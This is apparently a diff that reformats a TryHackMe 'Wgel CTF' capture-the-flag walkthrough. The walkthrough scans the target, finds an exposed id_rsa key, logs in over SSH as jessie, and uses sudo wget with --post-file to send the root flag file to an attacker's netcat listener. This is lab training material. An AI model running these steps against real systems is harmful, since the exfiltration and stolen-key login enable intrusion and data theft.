@@ -1,63 +1,142 @@
-TryHackMe - Room:Wgel CTF Writeup Solve Step By Step
-Solved By : Prince
-Date: 2025-09-30
-Difficulty: Easy
-The Contents of the Room:
-Task 1: User flag
-Task 2: Root flag
+# TryHackMe - Wgel CTF Walkthrough
 
-Tools used:
-Nmap
-Dirsearch
-Gobuster
-GTFOBins
+**Solved by:** Prince  
+**Date:** 2025-09-30  
+**Difficulty:** Easy  
 
-TryHackMe | Wgel CTF | Walkthrough
- Hello everyone! In this post, I’ll walk you through the WGELCTF room on TryHackMe. If you’re stuck or need a hint, I hope this step-by-step guide will help you finish the challenge. Let’s dive right in!
+---
 
-Step 1: Initial Recon and Port Scan
-As usual, we start by scanning for open ports using nmap. Here's a quick command for that:
-nmap -sV -sC -A <IP TARGET> -v
-This scan shows two open ports:
+## 📝 Room Contents
+- **Task 1:** User flag  
+- **Task 2:** Root flag  
 
-22/tcp (SSH)
-80/tcp (HTTP - Web Server)
-With SSH and a web service running, let’s focus first on port 80 and investigate the web application hosted on the server.
+---
 
-Step 1: Initial Recon and Port Scan
-As usual, we start by scanning for open ports using nmap. Here's a quick command for that:
+## 🔧 Tools Used
+- Nmap  
+- Dirsearch  
+- Gobuster  
+- GTFOBins  
 
- nmap -sV -sC -vvv -oN nmap-scan ip-add
+---
+
+## 🚩 Walkthrough
+
+### Step 1: Initial Recon and Port Scan
+We begin with a port scan using `nmap`:
+
+```bash
+nmap -sV -sC -vvv -oN nmap-scan <IP>
+
+Scan Results:
+
+22/tcp → SSH
+
+80/tcp → HTTP (Web Server)
 
 
- 
-This scan shows two open ports:
+With SSH and HTTP open, we first investigate the web server.
 
-22/tcp (SSH)
-80/tcp (HTTP - Web Server)
-With SSH and a web service running, let’s focus first on port 80 and investigate the web application hosted on the server.
+
+---
 
 Step 2: Exploring the Web Server
-Browsing to http://<target-ip>, you’ll see a website related to career opportunities. This is where we can try some directory brute-forcing to discover hidden files or directories.
 
-I used gobuster to brute force the directories:
+Browsing to http://<IP>/, we see a career opportunities website.
+To find hidden directories, we brute-force with Gobuster:
 
- gobuster dir -u http://<target-ip> -w /path/to/wordlist
- Through brute-forcing, I discovered a hidden directory called .ssh. Browsing to http://<target-ip>/.ssh/, I found an id_rsa file, which is the private key used for SSH authentication.
+gobuster dir -u http://<IP>/ -w /path/to/wordlist
 
- 
+Discovery: A hidden directory .ssh/
+
+Visiting http://<IP>/.ssh/ revealed an id_rsa private key.
+
+
+---
 
 Step 3: SSH Access Using id_rsa
-Now that we have the id_rsa private key, the next step is to download it and use it to log into the server. Here’s how you can do that:
 
-Right-click on the id_rsa file in your browser and download it to your machine.
-Adjust the permissions of the key file:
+1. Download the id_rsa file.
+
+
+2. Fix permissions:
+
+chmod 600 id_rsa
+
+
+3. Log into the target machine via SSH:
+
+ssh -i id_rsa jessie@<IP>
+
+
+
+
+---
+
 Step 4: Obtaining the User Flag
-Once logged in as jessie, the user flag can typically be found in the home directory. Navigate to it and read the flag:
-Step 5: Privilege Escalation
-Now, let's move on to privilege escalation to get the root flag.
 
-Running sudo -l to see what commands can be executed with elevated privileges revealed the following:
-Step 6: Exploiting Wget to Gain Root Flag
-To exploit this, we need to set up a listener on our own machine using netcat:
-Replace <your-ip> with the IP address of your machine (you can find it using ifconfig). This command posts the contents of /root/root_flag.txt to our listener. Once the request is sent, you’ll see the contents of the root flag in your terminal where netcat is running.
+Once inside as jessie, navigate to the home directory:
+
+cd /home/jessie
+cat user_flag.txt
+
+✅ User flag captured.
+
+
+---
+
+Step 5: Privilege Escalation
+
+Check sudo permissions:
+
+sudo -l
+
+It shows that wget can be run with elevated privileges.
+
+
+---
+
+Step 6: Exploiting wget to Gain Root Flag
+
+We can use wget to read the root flag file by exfiltrating it to our listener.
+
+1. Start a netcat listener on your local machine:
+
+nc -lvnp 1234
+
+
+2. On the target, run:
+
+sudo wget --post-file=/root/root_flag.txt http://<YOUR-IP>:1234
+
+
+3. The contents of /root/root_flag.txt will be sent to your netcat terminal.
+
+
+
+✅ Root flag captured.
+
+
+---
+
+🎯 Summary
+
+Performed initial recon with nmap.
+
+Found .ssh/ directory via Gobuster → retrieved id_rsa.
+
+Gained SSH access as user jessie.
+
+Captured User Flag.
+
+Used wget privilege escalation to capture the Root Flag.
+
+
+
+---
+
+📌 Flags
+
+User Flag: 🎉
+
+Root Flag: 🔑
